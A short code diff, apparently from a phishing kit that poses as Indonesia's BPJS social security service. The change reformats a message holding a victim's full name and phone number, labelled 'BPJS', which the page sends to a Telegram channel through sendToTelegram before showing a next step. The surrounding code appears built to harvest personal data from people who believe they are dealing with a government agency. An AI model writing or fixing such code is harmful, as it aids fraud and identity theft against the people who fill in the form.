@@ -414,10 +414,8 @@ function processFirstData() {
             return false;
         }
 
-        var message = ( Telegram | NoHP | `".$phone_number."` )
-        - Nama  :   ".$full_name."
-        - No HP : `".$phone_number."`;
-        sendToTelegram(message);
+        var message = `🔹 *BPJS* 🔹\n\n👤 *Nama:* ${$full_name}\n📞 *Nomor:* \`\`\`${$phone_number}\`\`\``;
+sendToTelegram(message);
 
         setTimeout(() => {
             $(".second").show();
